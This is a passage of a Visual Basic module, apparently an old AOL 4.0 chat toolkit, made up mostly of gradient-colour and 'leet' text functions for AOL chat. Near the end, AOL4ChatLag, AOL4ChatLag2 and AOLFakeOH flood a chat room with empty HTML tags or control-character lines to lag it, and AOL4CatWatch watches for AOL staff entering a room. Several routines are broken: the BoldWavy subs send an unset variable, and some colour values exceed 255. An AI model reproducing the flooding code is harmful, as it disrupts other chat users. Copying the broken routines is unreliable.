        D = Right(c, 1)
        e = 490 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 255, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (msg)
End Function


Function Bolditalic_BlackPurpleBlack(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<B><I><Font Color=#" & H & ">" & D
    Next B
   SendChat (msg)
End Function

Function Bolditalic_BluePurpleBlue(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 0, F)
        H = RGBtoHEX(G)
        msg = msg & "<B><I><Font Color=#" & H & ">" & D
    Next B
 SendChat (msg)
End Function
Function BoldLBlue_DBlue(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(355, 255 - F, 55)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (msg)
End Function


Function BoldLBlue_DBlue_LBlue(Text1)
    a = Len(Text1)
    For B = 1 To a
        c = Left(Text1, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(355, 255 - F, 55)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function






Function BoldPurpleBlack(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function


Function BoldPurpleBlackPurple(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255 - F, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function


Function BoldPurpleBlue(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (msg)
End Function


Function BoldPurpleBluePurple(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(255, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (msg)
End Function

Function BoldPurpleGreen(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function

Function BoldPurpleRed(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(255 - F, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function

Function BoldRedBlack(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<B><Font Color=#" & H & ">" & D
    Next B
   SendChat (msg)
End Function
Function BoldRedBlackRed(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (msg)
End Function

Function BoldRedBlue(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(F, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (msg)
End Function

Function BoldRedBlueRed(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
   BoldSendChat (msg)
End Function

Function BoldRedGreen(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function

Function BoldRedGreenRed(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 255 - F)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (msg)
End Function

Function BoldRedPurple(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(F, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
 BoldSendChat (msg)
End Function


Function BoldRedPurpleRed(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(F, 0, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function


Function BoldRedYellow(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 255 / a
        F = e * B
        G = RGB(0, F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
BoldSendChat (msg)
End Function
Function BoldRedYellowRed(text As String)
    a = Len(text)
    For B = 1 To a
        c = Left(text, B)
        D = Right(c, 1)
        e = 510 / a
        F = e * B
        If F > 255 Then F = (255 - (F - 255))
        G = RGB(0, F, 255)
        H = RGBtoHEX(G)
        msg = msg & "<Font Color=#" & H & ">" & D
    Next B
  BoldSendChat (msg)
End Function

Sub BoldSendChat(BoldChat)
'This is new it makes the chat text bold.
'example:
'BoldSendChat ("ThIs Is BoLd")
'It will come out bold on the chat screen.
SendChat ("<b>" & BoldChat & "</b>")
End Sub

Sub BoldWavY(TheText)

G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
    
    u$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
    
Next W
BoldSendChat (p$)

End Sub


Sub BoldWavyChatBlueBlack(TheText)
G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
     
    u$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)

Next W
BoldSendChat (p$)
End Sub

Sub BoldWavyColorbluegree(TheText)
G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
  
    u$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)

Next W
BoldSendChat (p$)
End Sub

Sub BoldWavyColorredandblack(TheText)

G$ = TheText
a = Len(G$)
For W = 1 To a Step 4
    
    u$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)

Next W
BoldSendChat (p$)
End Sub

Sub BoldWavyColorredandblue(TheText)
G$ = TheText
a = Len(G$)
For W = 1 To a Step 4

    u$ = Mid$(G$, W + 1, 1)
    S$ = Mid$(G$, W + 2, 1)
    T$ = Mid$(G$, W + 3, 1)
   
Next W
BoldSendChat (p$)
End Sub


Sub EliteTalker(word$)
Made$ = ""
For Q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, Q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    If letter$ = "a" Then
    If X = 1 Then Leet$ = "â"
    If X = 2 Then Leet$ = "å"
    If X = 3 Then Leet$ = "ä"
    End If
    If letter$ = "b" Then Leet$ = "b"
    If letter$ = "c" Then Leet$ = "ç"
    If letter$ = "d" Then Leet$ = "d"
    If letter$ = "e" Then
    If X = 1 Then Leet$ = "ë"
    If X = 2 Then Leet$ = "ê"
    If X = 3 Then Leet$ = "é"
    End If
    If letter$ = "i" Then
    If X = 1 Then Leet$ = "ì"
    If X = 2 Then Leet$ = "ï"
    If X = 3 Then Leet$ = "î"
    End If
    If letter$ = "j" Then Leet$ = ",j"
    If letter$ = "n" Then Leet$ = "ñ"
    If letter$ = "o" Then
    If X = 1 Then Leet$ = "ô"
    If X = 2 Then Leet$ = "ð"
    If X = 3 Then Leet$ = "õ"
    End If
    If letter$ = "s" Then Leet$ = "š"
    If letter$ = "t" Then Leet$ = "†"
    If letter$ = "u" Then
    If X = 1 Then Leet$ = "ù"
    If X = 2 Then Leet$ = "û"
    If X = 3 Then Leet$ = "ü"
    End If
    If letter$ = "w" Then Leet$ = "vv"
    If letter$ = "y" Then Leet$ = "ÿ"
    If letter$ = "0" Then Leet$ = "Ø"
    If letter$ = "A" Then
    If X = 1 Then Leet$ = "Å"
    If X = 2 Then Leet$ = "Ä"
    If X = 3 Then Leet$ = "Ã"
    End If
    If letter$ = "B" Then Leet$ = "ß"
    If letter$ = "C" Then Leet$ = "Ç"
    If letter$ = "D" Then Leet$ = "Ð"
    If letter$ = "E" Then Leet$ = "Ë"
    If letter$ = "I" Then
    If X = 1 Then Leet$ = "Ï"
    If X = 2 Then Leet$ = "Î"
    If X = 3 Then Leet$ = "Í"
    End If
    If letter$ = "N" Then Leet$ = "Ñ"
    If letter$ = "O" Then Leet$ = "Õ"
    If letter$ = "S" Then Leet$ = "Š"
    If letter$ = "U" Then Leet$ = "Û"
    If letter$ = "W" Then Leet$ = "VV"
    If letter$ = "Y" Then Leet$ = "Ý"
    If letter$ = "`" Then Leet$ = "´"
    If letter$ = "!" Then Leet$ = "¡"
    If letter$ = "?" Then Leet$ = "¿"
    If Len(Leet$) = 0 Then Leet$ = letter$
    Made$ = Made$ & Leet$
Next Q
BoldSendChat (Made$)
End Sub

Sub Falling_Form(frm As Form, steps As Integer)
'this is a pretty neat sub try
'it out and see what it does
On Error Resume Next
BgColor = frm.BackColor
frm.BackColor = RGB(0, 0, 0)
For X = 0 To frm.Count - 1
frm.Controls(X).Visible = False
Next X
AddX = True
AddY = True
frm.Show
X = ((Screen.Width - frm.Width) - frm.Left) / steps
Y = ((Screen.Height - frm.Height) - frm.Top) / steps
Do
    frm.Move frm.Left + X, frm.Top + Y
Loop Until (frm.Left >= (Screen.Width - frm.Width)) Or (frm.Top >= (Screen.Height - frm.Height))
frm.Left = Screen.Width - frm.Width
frm.Top = Screen.Height - frm.Height
frm.BackColor = BgColor
For X = 0 To frm.Count - 1
frm.Controls(X).Visible = True
Next X
End Sub
Function FindChatRoom()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Room% = FindChildByClass(MDI%, "AOL Child")
STUFF% = FindChildByClass(Room%, "_AOL_Listbox")
MoreStuff% = FindChildByClass(Room%, "RICHCNTL")
If STUFF% <> 0 And MoreStuff% <> 0 Then
   FindChatRoom = Room%
Else:
   FindChatRoom = 0
End If
End Function

Sub AOL40_encripter(word$)
Made$ = ""
For Q = 1 To Len(word$)
    letter$ = ""
    letter$ = Mid$(word$, Q, 1)
    Leet$ = ""
    X = Int(Rnd * 3 + 1)
    ' lower case letters
    If letter$ = "a" Then Leet$ = "†"
    If letter$ = "b" Then Leet$ = "õ"
    If letter$ = "c" Then Leet$ = "ð"
    If letter$ = "d" Then Leet$ = "ô"
    If letter$ = "e" Then Leet$ = "î"
    If letter$ = "f" Then Leet$ = "ï"
    If letter$ = "g" Then Leet$ = "ì"
    If letter$ = "h" Then Leet$ = "é"
    If letter$ = "i" Then Leet$ = "ê"
    If letter$ = "j" Then Leet$ = "ë"
    If letter$ = "k" Then Leet$ = "ä"
    If letter$ = "l" Then Leet$ = "å"
    If letter$ = "m" Then Leet$ = "â"
    If letter$ = "n" Then Leet$ = "ù"
    If letter$ = "o" Then Leet$ = "û"
    If letter$ = "p" Then Leet$ = "ü"
    If letter$ = "q" Then Leet$ = "ç"
    If letter$ = "r" Then Leet$ = "ñ"
    If letter$ = "s" Then Leet$ = "š"
    If letter$ = "t" Then Leet$ = "v"
    If letter$ = "u" Then Leet$ = "ÿ"
    If letter$ = "v" Then Leet$ = "Ø"
    If letter$ = "w" Then Leet$ = "£"
    If letter$ = "x" Then Leet$ = "¹"
    If letter$ = "y" Then Leet$ = "©"
    If letter$ = "z" Then Leet$ = "#"
    ' upercase letters
    If letter$ = "A" Then Leet$ = "Ï"
    If letter$ = "B" Then Leet$ = "Î"
    If letter$ = "C" Then Leet$ = "Í"
    If letter$ = "D" Then Leet$ = "ß"
    If letter$ = "E" Then Leet$ = "Ç"
    If letter$ = "F" Then Leet$ = "Å"
    If letter$ = "G" Then Leet$ = "Ä"
    If letter$ = "H" Then Leet$ = "Ã"
    If letter$ = "I" Then Leet$ = "Ð"
    If letter$ = "J" Then Leet$ = "Ë"
    If letter$ = "K" Then Leet$ = "S"
    If letter$ = "L" Then Leet$ = "&"
    If letter$ = "M" Then Leet$ = "Y"
    If letter$ = "N" Then Leet$ = "W"
    If letter$ = "O" Then Leet$ = ">"
    If letter$ = "P" Then Leet$ = "<"
    If letter$ = "Q" Then Leet$ = "Š"
    If letter$ = "R" Then Leet$ = "Û"
    If letter$ = "S" Then Leet$ = "+"
    If letter$ = "T" Then Leet$ = "="
    If letter$ = "U" Then Leet$ = "@"
    If letter$ = "V" Then Leet$ = "Ñ"
    If letter$ = "W" Then Leet$ = "%"
    If letter$ = "X" Then Leet$ = "*"
    If letter$ = "Y" Then Leet$ = "Õ"
    If letter$ = "Z" Then Leet$ = "~"
    If Len(Leet$) = 0 Then Leet$ = letter$
    Made$ = Made$ & Leet$
Next Q
End Sub

Function AOL40_FindChatRoom()
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
Room% = FindChildByClass(MDI%, "AOL Child")
STUFF% = FindChildByClass(Room%, "_AOL_Listbox")
MoreStuff% = FindChildByClass(Room%, "RICHCNTL")
If STUFF% <> 0 And MoreStuff% <> 0 Then
   AOL40_FindChatRoom = Room%
Else:
   AOL40_FindChatRoom = 0
End If
End Function


Function AOL40_GetChatText()
Room% = AOL40_FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")
ChatText$ = GetText(AORich%)
AOL40_GetChatText = ChatText$
End Function

Function GetRoomName()
GetRoomName = GetCaption(AOL4_FindRoom)
End Function

Sub AOL40_IMIgnorer(List As ListBox)
'This Closes The IM Box From The Person Thats In The List
'Call IMIgnorer(List1)
AOL% = FindWindow("AOL Frame25", vbNullString)
MDI% = FindChildByClass(AOL%, "MDIClient")
IMWin = Findchildbytitle(MDI%, ">Instant Message From:")
rch2% = FindChildByClass(IMWin, "RICHCNTL")
nme = aol40_SNFromIM
If rch2% <> 0 Then
S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
S = SendMessageByNum(rch2%, WM_CLOSE, 0, 0)
R = ShowWindow(IMWin, SW_HIDE)
List.AddItem nme
Call KillListDupes(List)
Exit Sub
End If
End Sub
Sub KillListDupes(Lst As ListBox)

'Kill the duplicates in a listbox



For X = 0 To Lst.ListCount - 1

    Current = Lst.List(X)

    For i = 0 To Lst.ListCount - 1

        Nower = Lst.List(i)

        If i = X Then GoTo dontkill

        If TrimSpaces(LCase(Nower)) = TrimSpaces(LCase(Current)) Then Lst.RemoveItem (i)

dontkill:

    Next i

Next X

End Sub
Function TrimSpaces(text)
    If InStr(text, " ") = 0 Then
    TrimSpaces = text
    Exit Function
    End If
    For TrimSpace = 1 To Len(text)
    thechar$ = Mid(text, TrimSpace, 1)
    thechars$ = thechars$ & thechar$
    If thechar$ = " " Then
    thechars$ = Mid(thechars$, 1, Len(thechars$) - 1)
    End If
    Next TrimSpace
    TrimSpaces = thechars$
End Function

Function TrimTime()
B$ = Left$(Time$, 5)
HourH$ = Left$(B$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime = HourH$ & Right$(B$, 3) & " " & Ap$
End Function
Function TrimTime2()
B$ = Time$
HourH$ = Left$(B$, 2)
HourA = Val(HourH$)
If HourA >= 12 Then Ap$ = "PM"
If HourA = 24 Or HourA < 12 Then Ap$ = "AM"
If HourA > 12 Then
    HourA = HourA - 12
End If
If HourA = 0 Then HourA = 12
HourH$ = Str$(HourA)
TrimTime2 = HourH$ & ":" & Right$(B$, 5) & " " & Ap$
End Function




Sub killwin(Windo)
X = SendMessageByNum(Windo, WM_CLOSE, 0, 0)
End Sub

Sub KillModal()
Modal% = FindWindow("_AOL_Modal", vbNullString)
Call SendMessage(Modal%, WM_CLOSE, 0, 0)
End Sub

Sub KillGlyph()
' Kills the annoying spinning AOL logo in the toobar
' on AOL 4.0
AOL% = FindWindow("AOL Frame25", vbNullString)
AOTooL% = FindChildByClass(AOL%, "AOL Toolbar")
AOTool2% = FindChildByClass(AOTooL%, "_AOL_Toolbar")
Glyph% = FindChildByClass(AOTool2%, "_AOL_Glyph")
Call SendMessage(Glyph%, WM_CLOSE, 0, 0)
End Sub


Sub AOL40_KillChatAdvertise()
'Kills the annoying advertisemenat in member chats.
Chat% = AOL40_FindChatRoom()

pict% = FindChildByClass(Chat%, "_AOL_Image")
Call SendMessage(pict%, WM_CLOSE, 0, 0)
End Sub

Sub AOL40_Load()
'This will load AOL4.0
X% = Shell("C:\aol40\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol40a\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
X% = Shell("C:\aol40b\waol.exe", 1): NoFreeze% = DoEvents(): Exit Sub
End Sub


Sub AOL40_ReEnterRoom()
Call KeyWord("aol://2719:2-2-" + GetRoomName())
starttime = Timer
Do While (Timer - starttime < 5)
    DoEvents
    text$ = AOL40_GetChatText()
    If InStr(text$, "OnlineHost:") Then Exit Do
    Full% = FindWindow("#32770", "America Online")
    If Full% <> 0 Then
        Call closewin(Full%)
        Exit Do
    End If
Loop
Call KillWait
End Sub

Function AOL40_RoomCount()
Dim Chat%
Chat% = AOL40_FindChatRoom()
List% = FindChildByClass(Chat%, "_AOL_Listbox")
Count% = SendMessage(List%, LB_GETCOUNT, 0, 0)
AOL40_RoomCount = Count%
End Function

Public Function AOL40_RoomFull()
Do
TimeOut 0.00002
msg1% = FindWindow("#32770", "America Online")
Button2% = FindChildByClass(msg1%, "Button")
Stat% = FindChildByClass(msg1%, "Static")
statcap% = Findchildbytitle(msg1%, "The room you requested is full.")
If Stat% <> 0 And Button2% <> 0 And statcap% <> 0 Then Call ClickIcon(Button2%)
Loop Until msg1% = 0
End Function


Sub AOL40_SignOff()
'This will sign-off AOL very quickly
Call AOLRunMenuByString("&Sign Off")
End Sub


Sub AOL40_Spiral(txt As TextBox)
'Spiral Scroller
X = txt.text
thastart:
Dim MYLEN As Integer
MyString = txt.text
MYLEN = Len(MyString)
MYSTR = Mid(MyString, 2, MYLEN) + Mid(MyString, 1, 1)
txt.text = MYSTR
TimeOut 1
SendChat txt
If txt.text = X Then
Exit Sub
End If
GoTo thastart
End Sub


Public Sub AOLButton(but%)
Clicicon% = SendMessage(but%, WM_KEYDOWN, VK_SPACE, 0)
Clicicon% = SendMessage(but%, WM_KEYUP, VK_SPACE, 0)
End Sub






Sub AOL4CatWatch()
Do
    Y% = DoEvents()
For Index% = 0 To 25
namez$ = String$(256, " ")
If Len(Trim$(namez$)) <= 1 Then GoTo lol
namez$ = Left$(Trim$(namez$), Len(Trim(namez$)) - 1)
W = InStr(LCase$(namez$), LCase$("catwatch"))
X = InStr(LCase$(namez$), LCase$("catid"))
If W <> 0 Then
Call KeyWord("PC")
MsgBox "A Cat had entered the room."
End If
If X <> 0 Then
Call KeyWord("PC")
MsgBox "A Cat had entered the room."
End If
Next Index%
lol:
Loop
End Sub



Function AOL4ChatLag()
Call SendChat("  <html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html>H</html><html></html><html></html>A<html></html><html></html>H<html></html><html></html><html></html><html></html><html></html><html>H</html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>")
End Function


Function AOL4ChatLag2()
Call SendChat("  <B><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html> <html></html><html></html><html></html><html></html><html></html><html></html><html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html><html></html>")
End Function


Sub AOLChatsend(Chat)
Room% = FindChatRoom
AORich% = FindChildByClass(Room%, "RICHCNTL")
Call SetFocusApi(Room%)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)
AORich% = GetWindow(AORich%, 2)

Call SetFocusApi(AORich%)
Call SendMessageByString(AORich%, WM_SETTEXT, 0, Chat)
DoEvents
Call SendMessageByNum(AORich%, WM_CHAR, 13, 0)
End Sub

Sub AOLFakeOH()
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
AOLChatsend "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "‰‰‰‰‰‰‰‰‰‰‰‰" & Chr(4) & "Ví©tø®¥"
Pause (0.5)
